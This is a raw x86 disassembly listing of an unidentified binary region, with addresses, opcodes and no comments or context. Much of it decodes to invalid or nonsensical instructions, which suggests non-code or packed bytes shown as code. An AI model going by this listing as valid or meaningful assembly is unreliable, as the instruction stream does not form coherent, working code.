  40d207:	mov    edi,0x32729e
  40d20c:	xor    eax,edi
  40d20e:	add    eax,DWORD PTR [ebp+0x3]
  40d211:	(bad)  
  40d212:	pavgb  mm7,mm1
  40d215:	test   DWORD PTR [esi-0x8],eax
  40d218:	dec    ebp
  40d219:	inc    ebp
  40d21a:	mov    edx,ebp
  40d21c:	cld    
  40d21d:	xlat   BYTE PTR ds:[ebx]
  40d21e:	enter  0xf0c7,0xf0
  40d222:	retf   0xf200
  40d225:	add    dh,cl
  40d227:	leave  
  40d228:	jne    0x40d26f
  40d22a:	mov    ecx,DWORD PTR [ebx-0x39ea1304]
  40d230:	enter  0xf0ce,0xc7
  40d234:	retf   0xf2cf
  40d237:	scas   eax,DWORD PTR es:[edi]
  40d238:	out    dx,al
  40d239:	jmp    0x40d288
  40d23b:	mov    esi,DWORD PTR [ebx]
  40d23d:	cld    
  40d23e:	add    eax,edi
  40d240:	xor    eax,esi
  40d242:	jmp    0x40d289
  40d244:	xor    ecx,DWORD PTR [ebp-0x1ffc07cd]
  40d24a:	add    edi,edi
  40d24c:	ror    DWORD PTR [ecx+0x45f8f889],cl
  40d252:	dec    ebp
  40d253:	mov    esi,DWORD PTR [ebx]
  40d255:	cld    
  40d256:	lea    eax,[edi+ecx*1+0xff72e0]
  40d25d:	mov    ecx,DWORD PTR [ebp-0xc]
  40d260:	mov    ecx,DWORD PTR [ebp-0x4]
  40d263:	xor    esi,eax
  40d265:	(bad)  
  40d266:	enter  0xce08,0x72
  40d26a:	stc    
  40d26b:	add    BYTE PTR [edx+0x5f8b4545],ch
  40d271:	call   0x33861f79
  40d276:	pop    esi
  40d277:	xor    eax,ebx
  40d279:	sub    ecx,DWORD PTR [ebx+0x20fc818b]
  40d27f:	enter  0xb900,0xc7
  40d283:	inc    ebp
  40d284:	in     al,dx
  40d285:	xor    eax,DWORD PTR [ebp+0x4589f803]
  40d28b:	clc    
  40d28c:	xor    al,0x45
  40d28e:	pushf  
  40d28f:	ss (bad) 
  40d291:	pushf  
  40d292:	call   0xf92c5922
  40d297:	mov    eax,edi
  40d299:	loopne 0x40d27f
  40d29b:	inc    ebp
  40d29c:	test   DWORD PTR [ebx],esi
  40d29e:	clc    
  40d29f:	add    eax,DWORD PTR [ebp-0x2d]
  40d2a2:	push   esi
  40d2a3:	mov    DWORD PTR [edi-0x4],edx
  40d2a6:	push   ecx
  40d2a7:	inc    ebp
  40d2a8:	push   edi
  40d2a9:	mov    al,dh
  40d2ab:	mov    BYTE PTR [esi+0x34d320b],bl
  40d2b1:	mov    ecx,DWORD PTR [ecx+0x45b6f8f8]
  40d2b7:	xor    edi,DWORD PTR ds:0xc7089c89
  40d2bd:	dec    ebp
  40d2be:	cld    
  40d2bf:	mov    ebx,DWORD PTR [eax]
  40d2c1:	or     dl,ch
  40d2c3:	into   
  40d2c4:	inc    ebp
  40d2c5:	iret   
  40d2c6:	or     dl,cl
  40d2c8:	add    BYTE PTR [ebx+ecx*4-0xb007420],cl
  40d2cf:	mov    ecx,DWORD PTR [ebp-0x4]
  40d2d2:	xor    ecx,edx
  40d2d4:	xor    ecx,DWORD PTR [ebp+0x3]
  40d2d7:	mov    eax,DWORD PTR [ebx]
  40d2d9:	hlt    
  40d2da:	bswap  esi
  40d2dc:	rol    DWORD PTR [ecx+esi*1+0x2b32459e],0x89
  40d2e4:	xor    ecx,DWORD PTR [eax]
  40d2e6:	mov    DWORD PTR [ebp-0x8],eax
  40d2e9:	xor    ebx,DWORD PTR [ebp-0x47]
  40d2ec:	call   0x40d17e
  40d2f1:	enter  0x4d45,0x8b
  40d2f5:	mov    eax,edi
  40d2f7:	lock dec ebp
  40d2f9:	inc    ebp
  40d2fa:	mov    DWORD PTR [ebx-0x39040f73],ecx
  40d300:	inc    edi
  40d302:	inc    ebp
  40d303:	enter  0x918b,0xfc
  40d307:	inc    ebp
  40d308:	(bad)  
  40d309:	mov    eax,DWORD PTR [eax+edi*8-0x38cd3962]
  40d310:	mov    DWORD PTR [esi-0x4],ebx
  40d313:	rol    DWORD PTR [ebp-0x37],0x8b
  40d317:	add    al,0xf4
  40d319:	push   ebp
  40d31a:	into   
  40d31b:	in     al,dx
  40d31c:	mov    BYTE PTR [ebp-0x3f],0x8b
  40d320:	dec    ebp
  40d321:	or     BYTE PTR [ebx],bh
  40d323:	xor    BYTE PTR [esi+0x1],0x8b
  40d327:	add    ah,ah
  40d329:	add    dh,al
  40d32b:	in     al,dx
  40d32c:	(bad)  
  40d32d:	push   ebx
  40d32e:	inc    ebp
  40d32f:	mov    eax,edi
  40d331:	adc    al,ch
  40d333:	push   ss
  40d334:	xchg   BYTE PTR [edi+0x7db08f8],bh
  40d33a:	popa   
  40d33b:	iret   
  40d33c:	dec    ebp
  40d33d:	sahf   
  40d33e:	mov    esi,DWORD PTR [edx]
  40d340:	clc    
  40d341:	add    ecx,esi
  40d343:	cmp    ecx,edi
  40d345:	jne    0x40d32f
  40d347:	add    DWORD PTR [ebp-0x62],0x4208648b
  40d34e:	or     BYTE PTR [ebx+0x48ae94d],bl
  40d354:	or     eax,DWORD PTR [eax]
  40d356:	push   ebp
  40d357:	dec    ebp
  40d358:	jnp    0xd00ae027
  40d35e:	dec    ebp
  40d35f:	xlat   BYTE PTR ds:[ebx]
  40d360:	mov    ecx,ebx
  40d362:	call   0x340b293a
  40d367:	lsl    ecx,WORD PTR ds:0x7f8b2d23
  40d36e:	(bad)  
  40d36f:	cld    
  40d370:	sti    
  40d371:	lahf   
  40d372:	(bad)  
  40d373:	mov    ebp,0x8b330055
  40d378:	mov    DWORD PTR [eax],ecx
  40d37a:	clc    
  40d37b:	iret   
  40d37c:	dec    ebp
  40d37d:	retf   
  40d37e:	xor    eax,ecx
  40d380:	lea    eax,[eax+ecx*1+0x7204]
  40d387:	dec    ebp
  40d388:	inc    ebp
  40d389:	mov    DWORD PTR [ebx-0x39b20b24],ecx
  40d38f:	mov    esp,DWORD PTR [edx+0x14]
  40d392:	int    0x6
  40d394:	sub    eax,DWORD PTR [ebp+0x3]
  40d397:	(bad)  
  40d398:	lock or BYTE PTR [ebp-0x7b],cl
  40d39c:	mov    edi,eax
  40d39e:	in     al,dx
  40d39f:	xor    al,0x4d
  40d3a1:	pushf  
  40d3a2:	xor    ecx,DWORD PTR [ecx+0x453bf003]
  40d3a8:	jne    0x40d333
  40d3aa:	mov    ebx,DWORD PTR [eax]
  40d3ac:	in     al,0x45
  40d3ae:	dec    ebp
  40d3af:	mov    esi,DWORD PTR [ebx]
  40d3b1:	nop
  40d3b2:	add    eax,DWORD PTR [eax]
  40d3b4:	pop    edi
  40d3b5:	mov    esi,DWORD PTR [ebx]
  40d3b7:	mov    DWORD PTR [ebx-0x2c],ebx
  40d3ba:	ret    0x4d
  40d3bd:	mov    ecx,DWORD PTR [ebx+0x18008b90]
  40d3c3:	mov    ecx,DWORD PTR [ebp+0x3]
  40d3c6:	mov    edi,DWORD PTR [eax+edx*4]
  40d3c9:	dec    ebp
  40d3ca:	add    BYTE PTR [ebx-0x387cf775],cl
  40d3d0:	jo     0x40d395
  40d3d2:	push   esi
  40d3d3:	inc    ebp
  40d3d4:	jne    0x40d361
  40d3d6:	mov    ecx,DWORD PTR [eax]
  40d3d8:	push   edi
  40d3d9:	(bad)  
  40d3da:	push   edi
  40d3db:	ret    
  40d3dc:	push   ecx
  40d3dd:	inc    ebp
  40d3de:	xor    ecx,DWORD PTR [ebx+0x40720cbb]
  40d3e4:	add    BYTE PTR [ebx+0x45d10ccb],al
  40d3ea:	jnp    0x406de01d
  40d3f0:	jg     0x40d37d
  40d3f2:	jmp    0x54:0xde85700c
  40d3f9:	inc    ebp
  40d3fa:	mov    esi,DWORD PTR [eax+ecx*1-0x75]
  40d3fe:	push   ebp
  40d3ff:	cmp    BYTE PTR [ebx],dh
  40d401:	dec    ebp
  40d402:	xor    ecx,DWORD PTR [ebx-0x8fcabfd]
  40d408:	cmp    esp,DWORD PTR [ebx]
  40d40a:	jne    0x40d397
  40d40c:	or     DWORD PTR [esi+ebx*4],0xef036440
  40d413:	jmp    0x40d42a
  40d415:	mov    ebp,ecx
  40d417:	push   esp
  40d418:	add    al,0x45
  40d41a:	add    BYTE PTR [ebx-0x38ccf7b3],cl
  40d420:	add    eax,ebx
  40d422:	cmp    eax,DWORD PTR [ebp+0xf]
  40d425:	mov    esp,DWORD PTR [eax+ecx*1-0x3c743900]
  40d42c:	sbb    BYTE PTR [ebp+0x45],al
  40d42f:	mov    ecx,DWORD PTR [ecx+0x4d4d1808]
  40d435:	xor    ecx,DWORD PTR [ebx-0x277676fd]
  40d43b:	mov    DWORD PTR [ebp+0x14],eax
  40d43e:	xor    eax,0xba339c45
  40d443:	pushf  
  40d444:	test   edi,eax
  40d446:	clc    
  40d447:	adc    al,0x55
  40d449:	test   DWORD PTR [ebx+0x454518f8],ecx
  40d44f:	xor    DWORD PTR [ebx-0x7f74e764],ecx
  40d455:	lock add DWORD PTR [ebp+0x0],ecx
  40d459:	xor    eax,DWORD PTR [eax]
  40d45b:	add    ecx,DWORD PTR [ebp+0xf]
  40d45e:	mov    eax,ecx
  40d460:	sbb    BYTE PTR [ebp-0x77],cl
  40d463:	mov    eax,DWORD PTR [ecx]
  40d465:	rol    BYTE PTR [eax],1
  40d467:	iret   
  40d468:	or     DWORD PTR [eax+ecx*2+0xc32899e],ecx
  40d46f:	cmp    eax,DWORD PTR [ebp+0xf]
  40d472:	xor    ebp,DWORD PTR [ebx+eax*1-0xb747700]
  40d479:	or     BYTE PTR [ebp-0x39],al
  40d47c:	xor    eax,ebx
  40d47e:	add    eax,DWORD PTR [ebp-0x77]
  40d481:	mov    edx,DWORD PTR [eax+ebx*1]
  40d484:	inc    ebp
  40d485:	inc    ebp
  40d486:	mov    ecx,DWORD PTR [ecx+0x75e8f450]
  40d48c:	mov    DWORD PTR [ebx+0x4d45dcd0],ecx
  40d492:	mov    ebp,eax
  40d494:	cmp    cl,dh
  40d496:	dec    ebp
  40d497:	dec    DWORD PTR [eax+0x45]
  40d49a:	inc    ecx
  40d49b:	(bad)  
  40d49c:	mov    esp,eax
  40d49e:	or     al,0x85
  40d4a0:	sbb    al,bh
  40d4a2:	inc    eax
  40d4a3:	inc    ebp
  40d4a4:	mov    esi,DWORD PTR [ebx]
  40d4a6:	or     al,0x3
  40d4a8:	dec    ecx
  40d4a9:	push   eax
  40d4aa:	dec    eax
  40d4ab:	inc    ebp
  40d4ac:	rcl    BYTE PTR [eax-0x38],1
  40d4af:	push   eax
  40d4b0:	inc    ebp
  40d4b1:	dec    DWORD PTR [ebx-0x3e07c775]
  40d4b7:	rol    BYTE PTR [ebx],0x4e
  40d4ba:	inc    eax
  40d4bb:	inc    ebp
  40d4bc:	mov    DWORD PTR [ebx],esi
  40d4be:	sbb    BYTE PTR [ebx],al
  40d4c0:	inc    ebp
  40d4c1:	push   eax
  40d4c2:	xor    esi,DWORD PTR [ebp+0x3]
  40d4c5:	lea    ecx,[ecx+0x45e814b8]
  40d4cb:	cmc    
  40d4cc:	xor    edi,edi
  40d4ce:	add    eax,DWORD PTR [ebp-0x77]
  40d4d1:	mov    DWORD PTR [eax+eiz*8],edx
  40d4d4:	inc    ebp
  40d4d5:	inc    ebp
  40d4d6:	mov    ecx,DWORD PTR [ebx-0x3e38232c]
  40d4dc:	ret    
  40d4dd:	inc    ebp
  40d4de:	add    DWORD PTR [ebx+0x4dc7f855],ecx
  40d4e4:	adc    al,0x8b
  40d4e6:	test   DWORD PTR [eax],edx
  40d4e8:	clc    
  40d4e9:	inc    ecx
  40d4ea:	inc    ebp
  40d4eb:	mov    esi,DWORD PTR [edx]
  40d4ed:	loopne 0x40d48b
  40d4ef:	enter  0x16c7,0x14
  40d4f3:	inc    ebp
  40d4f4:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  40d4fa:	mov    eax,DWORD PTR [ebx]
  40d4fc:	sbb    BYTE PTR [eax],cl
  40d4fe:	(bad)  
  40d4ff:	dec    ebp
  40d500:	ret    
  40d501:	sub    ebp,DWORD PTR [edi+0x8028be9]
  40d507:	add    BYTE PTR [ebp+0xc],dl
  40d50a:	xor    esi,DWORD PTR [ebp-0x73]
  40d50d:	lea    edx,[ecx]
  40d50f:	lods   al,BYTE PTR ds:[esi]
  40d510:	jb     0x40d4fa
  40d512:	add    ch,dh
  40d514:	sar    edi,0x83
  40d517:	xor    eax,0x89009c03
  40d51c:	inc    ebp
  40d51d:	int3   
  40d51e:	xor    eax,DWORD PTR [ebp+0x3]
  40d521:	xor    al,0x89
  40d523:	pushf  
  40d524:	adc    al,0xc7
  40d526:	inc    ebp
  40d527:	les    eax,FWORD PTR [ebx]
  40d529:	test   esp,ebx
  40d52b:	clc    
  40d52c:	inc    ebp
  40d52d:	inc    ebp
  40d52e:	push   DWORD PTR [edx]
  40d530:	hlt    
  40d531:	pushf  
  40d532:	jne    0x40d4c1
  40d534:	mov    ecx,esp
  40d536:	or     al,0x4d
  40d538:	bound  ecx,QWORD PTR [ebp+0x4d89c8ff]
  40d53e:	clc    
  40d53f:	lea    eax,[ebp-0x3c]
  40d542:	cmp    eax,0x8b8d9c4d
  40d547:	shl    al,0x4d
  40d54a:	(bad)  
  40d54b:	mov    eax,ebx
  40d54d:	or     BYTE PTR [ebp-0x17344731],cl
  40d553:	dec    ebp
  40d554:	imul   ecx
  40d556:	inc    DWORD PTR [ecx]
  40d558:	inc    ebp
  40d559:	add    BYTE PTR [ebp-0x74638bcd],al
  40d55f:	pavgb  mm7,mm6
  40d562:	mov    DWORD PTR [eax],0xf0ff8bc3
  40d568:	clc    
  40d569:	iret   
  40d56a:	inc    ebp
  40d56b:	lock push eax
  40d56d:	retf   
  40d56e:	fmul   QWORD PTR [ebp-0x1]
  40d571:	mov    ecx,DWORD PTR [ebx+0x45f7f4e0]
  40d577:	test   BYTE PTR [ebx+0x4d32e09e],cl
  40d57d:	mov    DWORD PTR [ebx],ebp
  40d57f:	loopne 0x40d50a
  40d581:	inc    ebp
  40d582:	loopne 0x40d50f
  40d584:	inc    ebp
  40d585:	loopne 0x40d512
  40d587:	xbegin 0x4091650
  40d58d:	adc    ecx,DWORD PTR [eax*2+0x33b334d]
  40d594:	jb     0x40d5e6
  40d596:	mov    ecx,DWORD PTR [eax+edi*8]
  40d599:	inc    ebp
  40d59a:	inc    eax
  40d59b:	push   eax
  40d59c:	mov    ebx,DWORD PTR [edi-0x8]
  40d59f:	inc    DWORD PTR [ecx-0x75]
  40d5a2:	mov    ebp,esp
  40d5a4:	loopne 0x40d5a6
  40d5a6:	rol    edi,0xee
  40d5a9:	test   BYTE PTR [eax],al
  40d5ab:	dec    edx
  40d5ac:	push   0x32
  40d5ae:	dec    DWORD PTR [ebx-0x30baf70c]
  40d5b4:	push   eax
  40d5b5:	mov    dh,0x94
  40d5b7:	add    edi,edi
  40d5b9:	cmp    edi,DWORD PTR [eax-0x7877af1]
  40d5bf:	add    BYTE PTR [ebp-0x75],al
  40d5c2:	(bad)  
  40d5c3:	call   0xc7c5d690
  40d5c8:	clc    
  40d5c9:	test   BYTE PTR [ebp+0x4a],al
  40d5cc:	xor    esi,DWORD PTR [edx]
  40d5ce:	pushf  
  40d5cf:	mov    eax,edi
  40d5d1:	or     al,al
  40d5d3:	iret   
  40d5d4:	test   DWORD PTR [esi+0x3b4d03f8],esi
  40d5da:	mov    DWORD PTR [edi],ecx
  40d5dc:	in     al,dx
  40d5dd:	pop    eax
  40d5de:	dec    ebp
  40d5df:	add    BYTE PTR [ecx+0x4df8e88b],cl
  40d5e5:	add    BYTE PTR [ecx+0x4d84f8c7],cl
  40d5eb:	dec    edx
  40d5ec:	mov    DWORD PTR [edx],esi
  40d5ee:	in     al,0x8b
  40d5f0:	dec    ebp
  40d5f1:	or     BYTE PTR [ebx],dh
  40d5f3:	iret   
  40d5f4:	add    esi,DWORD PTR [esi+0x3be00389]
  40d5fa:	test   DWORD PTR [edi],0x3d3800
  40d600:	test   DWORD PTR [ebx+0x84e4f8],ecx
  40d606:	add    edi,eax
  40d608:	add    BYTE PTR [ebp+ecx*2-0x74cdccb6],al
  40d60f:	mov    eax,DWORD PTR [ebx]
  40d611:	or     BYTE PTR [ecx+0x45b614cf],cl
  40d617:	add    esi,DWORD PTR [ebx]
  40d619:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  40d61f:	add    BYTE PTR [eax],al
  40d621:	mov    eax,DWORD PTR [ebp-0x18]
  40d624:	mov    eax,DWORD PTR [eax]
  40d626:	lock (bad) 
  40d628:	dec    ebp
  40d629:	test   BYTE PTR [ebx],dh
  40d62b:	dec    edx
  40d62c:	add    esi,DWORD PTR [edx]
  40d62e:	cmp    ecx,DWORD PTR [ebx+0x98bec75]
  40d634:	or     bh,cl
  40d636:	(bad)  
  40d637:	mov    ebx,es
  40d639:	dec    edx
  40d63a:	push   0x32
  40d63c:	lea    esi,[edx]
  40d63e:	lods   al,BYTE PTR ds:[esi]
  40d63f:	mov    ebp,eax
  40d641:	clc    
  40d642:	cli    
  40d643:	or     edi,edi
  40d645:	iret   
  40d646:	inc    ebp
  40d647:	mov    WORD PTR [ebx-0x75cdccb6],cs
  40d64d:	or     al,BYTE PTR ds:0xec728b
  40d653:	or     DWORD PTR [ebp-0x31],ecx
  40d656:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb2]
  40d65d:	cmp    al,cl
  40d65f:	je     0x40d839
  40d665:	mov    eax,DWORD PTR [ebp-0x8]
  40d668:	mov    eax,DWORD PTR [eax]
  40d66a:	xor    eax,edi
  40d66c:	mov    al,BYTE PTR [ebp+eax*1+0x32724a]
  40d673:	mov    ecx,DWORD PTR [ebp-0x18]
  40d676:	xor    ecx,DWORD PTR [ecx]
  40d678:	bswap  edi
  40d67a:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb6],0x32
  40d682:	add    DWORD PTR [ebx+0x945e400],ecx
  40d688:	mov    ecx,edi
  40d68a:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054a]
  40d691:	or     al,BYTE PTR [eax]
  40d693:	mov    ecx,DWORD PTR [ebp-0x18]
  40d696:	xor    ecx,DWORD PTR [ecx]
  40d698:	bswap  edi
  40d69a:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb2],0x3a
  40d6a2:	add    DWORD PTR [edi],ecx
  40d6a4:	add    BYTE PTR [eax-0x7474ffbb],dl
  40d6aa:	xor    esp,esp
  40d6ac:	mov    al,BYTE PTR [eax]
  40d6ae:	add    eax,0x8472c7
  40d6b3:	dec    edx
  40d6b4:	dec    ebp
  40d6b5:	xor    dh,BYTE PTR [ebx]
  40d6b7:	mov    ecx,DWORD PTR [edi]
  40d6b9:	clc    
  40d6ba:	ror    BYTE PTR [ecx],0xcb
  40d6bd:	iret   
  40d6be:	ror    DWORD PTR [esp+eax*4+0x32014a],0x32
  40d6c6:	inc    ebp
  40d6c7:	mov    ecx,DWORD PTR [ebx-0x75f6cc14]
  40d6cd:	iret   
  40d6ce:	add    eax,0x4a728c
  40d6d3:	xor    cl,BYTE PTR [ebp+0xa]
  40d6d6:	mov    ecx,DWORD PTR [ebx+0x98af833]
  40d6dc:	or     eax,0x8c72cf
  40d6e1:	dec    esi
  40d6e2:	shl    DWORD PTR [edx],0x4d
  40d6e5:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  40d6eb:	in     al,0xd
  40d6ed:	add    BYTE PTR [edx-0x39],dh
  40d6f0:	add    BYTE PTR [ecx+eax*8-0x74cdb2b6],al
  40d6f7:	mov    esi,DWORD PTR [ebx]
  40d6f9:	in     al,dx
  40d6fa:	mov    cl,BYTE PTR [ecx]
  40d6fc:	or     eax,0x8c72cf
  40d701:	dec    edx
  40d702:	enter  0x8532,0x32
  40d706:	add    BYTE PTR [ebx+0x945e800],cl
  40d70c:	mov    ecx,edi
  40d70e:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054a]
  40d715:	or     al,BYTE PTR [eax]
  40d717:	mov    ecx,DWORD PTR [ebp-0x1c]
  40d71a:	mov    ecx,DWORD PTR [ecx]
  40d71c:	xor    ecx,edi
  40d71e:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724e]
  40d725:	cmp    al,cl
  40d727:	jne    0x40d776
  40d729:	lea    ecx,[ebx-0x7517cc54]
  40d72f:	cli    
  40d730:	or     eax,0x4d72ff
  40d735:	cmp    eax,ecx
  40d737:	je     0x40d786
  40d739:	mov    ecx,DWORD PTR [ebx-0x7538ccf8]
  40d73f:	ret    
  40d740:	or     eax,0x8b7245
  40d745:	lock enter 0x85c7,0x84
  40d74a:	add    BYTE PTR [esi+0x33453200],bl
  40d750:	mov    ecx,DWORD PTR [ebx+0x558a0833]
  40d756:	add    eax,0x37233
  40d75b:	cmp    ecx,DWORD PTR [ebp+0xf]
  40d75e:	mov    esi,edi
  40d760:	xor    edi,edi
  40d762:	mov    cl,BYTE PTR [ebx+0x4d72080d]
  40d768:	add    BYTE PTR [ebx],dh
  40d76a:	rol    DWORD PTR [ebx],0x4d
  40d76d:	cmp    ecx,DWORD PTR [ebx-0x7574cc8b]
  40d773:	lock or eax,0x33724d
  40d779:	(bad)  
  40d77a:	ror    DWORD PTR [eax],0x4d
  40d77d:	jb     0x40d70a
  40d77f:	add    BYTE PTR [ebx],dh
  40d781:	ja     0x40d70d
  40d783:	sbb    BYTE PTR ds:0x8d7275,cl
  40d789:	xchg   esp,eax
  40d78a:	enter  0x50e8,0xf3
  40d78e:	inc    ebp
  40d78f:	dec    DWORD PTR [ebx-0x7574ccbb]
  40d795:	loopne 0x40d79c
  40d797:	(bad)  
  40d798:	jb     0x40d75d
  40d79a:	add    cl,al
  40d79c:	dec    ebp
  40d79d:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  40d7a3:	add    ecx,DWORD PTR ds:0x187250
  40d7a9:	inc    ebp
  40d7aa:	rcl    DWORD PTR [eax+0x4d],0x4f
  40d7ae:	mov    edi,edi
  40d7b0:	xor    ecx,DWORD PTR [ebx-0x3ff20b76]
  40d7b6:	jb     0x40d741
  40d7b8:	add    BYTE PTR [ecx+eax*8],dl
  40d7bb:	jne    0x40d80a
  40d7bd:	dec    DWORD PTR [ebx-0x75baccec]
  40d7c3:	add    ecx,DWORD PTR ds:0xe872d8
  40d7c9:	repnz enter 0x10ff,0x45
  40d7ce:	inc    ebp
  40d7cf:	mov    edx,DWORD PTR [eax-0x20]
  40d7d2:	mov    ds:0x8bc3ffc7,eax
  40d7d7:	shl    DWORD PTR [ecx+edx*1+0x750a00c1],0x45
  40d7df:	mov    esi,DWORD PTR [ebx]
  40d7e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7e2:	add    eax,DWORD PTR [ebp-0x77]
  40d7e5:	push   eax
  40d7e6:	adc    al,0x15
  40d7e8:	inc    ebp
  40d7e9:	push   DWORD PTR [ebx]
  40d7eb:	mov    ecx,DWORD PTR [ebp+0x724d30d4]
  40d7f1:	add    DWORD PTR [eax],eax
  40d7f3:	mov    eax,edi
  40d7f5:	test   al,0x4d
  40d7f7:	inc    ebp
  40d7f8:	mov    ecx,DWORD PTR [ecx+0x45cf1814]
  40d7fe:	retf   
  40d7ff:	mov    edx,ecx
  40d801:	sbb    BYTE PTR [edi+eax*8-0x50003c03],al
  40d808:	inc    ebp
  40d809:	mov    ecx,DWORD PTR [ebx-0x38aaebf8]
  40d80f:	xor    eax,ebx
  40d811:	(bad)  
  40d812:	enter  0x1111,0x72
  40d816:	inc    ebp
  40d817:	add    BYTE PTR [ebx-0x387de73f],cl
  40d81d:	cld    
  40d81e:	test   bh,bh
  40d820:	sahf   
  40d821:	jne    0x40d855
  40d823:	mov    ebp,ebx
  40d825:	fsubr  DWORD PTR [edx+0x6]
  40d828:	dec    DWORD PTR [edx]
  40d82a:	hlt    
  40d82b:	xor    eax,0x7f502d45
  40d830:	sbb    ch,ah
  40d832:	call   DWORD PTR [edx-0x75]
  40d835:	pop    esi
  40d836:	or     cl,cl
  40d838:	dec    ebp
  40d839:	adc    al,0x33
  40d83b:	push   ebp
  40d83c:	add    ebp,esp
  40d83e:	cmp    esp,esp
  40d840:	je     0x40d7c5
  40d842:	mov    esp,DWORD PTR [eax]
  40d844:	or     BYTE PTR ds:0x89c39cc7,dh
  40d84a:	push   0x24
  40d84c:	lea    ecx,[ebp+0x44e8ff94]
  40d852:	clc    
  40d853:	or     al,0xff
  40d855:	push   esp
  40d856:	inc    ebp
  40d857:	or     BYTE PTR [ebx+0x450818be],al
  40d85d:	pop    es
  40d85e:	call   esi
  40d860:	test   al,0xbf
  40d862:	jne    0x40d8d6
  40d864:	mov    eax,DWORD PTR [eax]
  40d866:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d867:	xlat   BYTE PTR ds:[ebx]
  40d868:	inc    ebp
  40d869:	push   esp
  40d86a:	push   eax
  40d86b:	or     al,0xde
  40d86d:	push   ebp
  40d86e:	dec    DWORD PTR [ecx-0x74f7db75]
  40d874:	dec    ebp
  40d875:	adc    BYTE PTR [ebx],dh
  40d877:	rol    DWORD PTR [ebx],1
  40d879:	sbb    BYTE PTR [ebx],bh
  40d87b:	dec    esp
  40d87c:	je     0x40d892
  40d87e:	push   0x54
  40d880:	call   DWORD PTR [eax]
  40d882:	test   al,0xce
  40d884:	inc    ebp
  40d885:	iret   
  40d886:	add    ebp,DWORD PTR [edi+0x24e889d8]
  40d88c:	clc    
  40d88d:	jmp    0x85da91
  40d892:	mov    edx,eax
  40d894:	test   al,0x1f
  40d896:	or     BYTE PTR [ebp+eax*2+0x10],al
  40d89a:	add    ecx,DWORD PTR [eax+ebx*1+0x14]
  40d89e:	inc    ebp
  40d89f:	(bad)  
  40d8a0:	mov    eax,DWORD PTR [eax+esi*8+0x33324d9e]
  40d8a7:	mov    DWORD PTR [ebx],eax
  40d8a9:	and    al,0xf
  40d8ab:	push   0xf84d85c1
  40d8b0:	mov    edi,ebp
  40d8b2:	rol    BYTE PTR [eax],1
  40d8b4:	iret   
  40d8b5:	or     DWORD PTR [ebx+esi*1+0x75329c9e],0x850f683b
  40d8c0:	push   edi
  40d8c1:	clc    
  40d8c2:	(bad)  
  40d8c3:	jmp    0x40d850
  40d8c5:	add    BYTE PTR [eax],dl
  40d8c7:	mov    eax,0xf8898545
  40d8cc:	jmp    0x40d89e
  40d8ce:	add    DWORD PTR [ebp+0x64009e],0x206544bf
  40d8d8:	pop    edi
  40d8d9:	inc    esp
  40d8da:	pop    ebx
  40d8db:	sbb    dl,al
  40d8dd:	inc    ebp
  40d8de:	add    BYTE PTR [ecx-0x747cdb75],cl
  40d8e4:	clc    
  40d8e5:	and    al,0xec
  40d8e7:	mov    DWORD PTR [ecx-0x7747adc],edi
  40d8ed:	and    al,0x4c
  40d8ef:	mov    DWORD PTR [eax],ecx
  40d8f1:	and    al,0x41
  40d8f3:	mov    ecx,DWORD PTR [ecx-0x7474dbdc]
  40d8f9:	and    al,0x24
  40d8fb:	xor    edx,DWORD PTR [esi+0x3]
  40d8fe:	push   edi
  40d8ff:	mov    DWORD PTR [ecx-0x75],edx
  40d902:	xor    esp,DWORD PTR [edi+edx*2]
  40d905:	mov    ebx,DWORD PTR [esi+0x3003294]
  40d90b:	mov    ecx,DWORD PTR [ecx-0x74dbdb75]
  40d911:	mov    ecx,DWORD PTR [esp+edx*4]
  40d914:	push   esp
  40d915:	add    BYTE PTR [eax],ah
  40d917:	mov    edx,DWORD PTR [ebp+0x3]
  40d91a:	cmp    edi,DWORD PTR [esi*2+0x24188b4c]
  40d921:	mov    DWORD PTR [ebx+0x33002401],ecx
  40d927:	dec    ecx
  40d928:	add    ebp,DWORD PTR [edx+0xf]
  40d92b:	push   0x4c30ca
  40d930:	adc    BYTE PTR [eax+0x1f],dh
  40d933:	push   0x0
  40d935:	(bad)  
  40d936:	cmp    ecx,DWORD PTR [ecx-0x7474db8b]
  40d93c:	and    al,0x24
  40d93e:	mov    esi,DWORD PTR [ebx]
  40d940:	and    al,0x3
  40d942:	xor    ecx,DWORD PTR [ecx-0x74f7db73]
  40d948:	jb     0x40d96e
  40d94a:	add    bh,bh
  40d94c:	inc    esp
  40d94d:	and    al,0x14
  40d94f:	lea    esi,[ebx]
  40d951:	and    al,0x9c
  40d953:	push   eax
  40d954:	jmp    0x54d99d
  40d959:	(bad)  
  40d95a:	cli    
  40d95b:	and    al,0x85
  40d95d:	(bad)  
  40d95e:	clc    
  40d95f:	and    al,0xa
  40d961:	call   0xffddd298
  40d966:	jmp    0x54d9af
  40d96b:	dec    esp
  40d96c:	aas    
  40d96d:	or     al,0x9c
  40d96f:	(bad)  
  40d970:	cmp    eax,edi
  40d972:	bswap  eax
  40d974:	mov    bh,0x4b
  40d976:	add    BYTE PTR [ebx+ecx*4+0x20],al
  40d97a:	and    al,0x4c
  40d97c:	mov    DWORD PTR [esp],ebx
  40d97f:	(bad)  
  40d980:	mov    eax,edi
  40d982:	or     BYTE PTR [edi-0x76e3dbbc],ch
  40d988:	inc    esp
  40d989:	jmp    0x40d99f
  40d98b:	add    DWORD PTR [edx+esi*1+0x20],0x1075449c
  40d993:	push   0xf8148544
  40d998:	inc    esp
  40d999:	sbb    BYTE PTR [edx+edi*8],dl
  40d99c:	dec    esp
  40d99d:	test   DWORD PTR [eax+edi*8],ebx
  40d9a0:	mov    BYTE PTR [edi],0xc7
  40d9a3:	xor    BYTE PTR [ecx],al
  40d9a5:	pushf  
  40d9a6:	inc    esp
  40d9a7:	jmp    0x40d9c1
  40d9a9:	add    DWORD PTR [eax+0x9c0130],0x44500875
  40d9b3:	jne    0x40d9cd
  40d9b5:	or     DWORD PTR [eax+0x100185],eax
  40d9bb:	or     al,0x0
  40d9bd:	jne    0x40da00
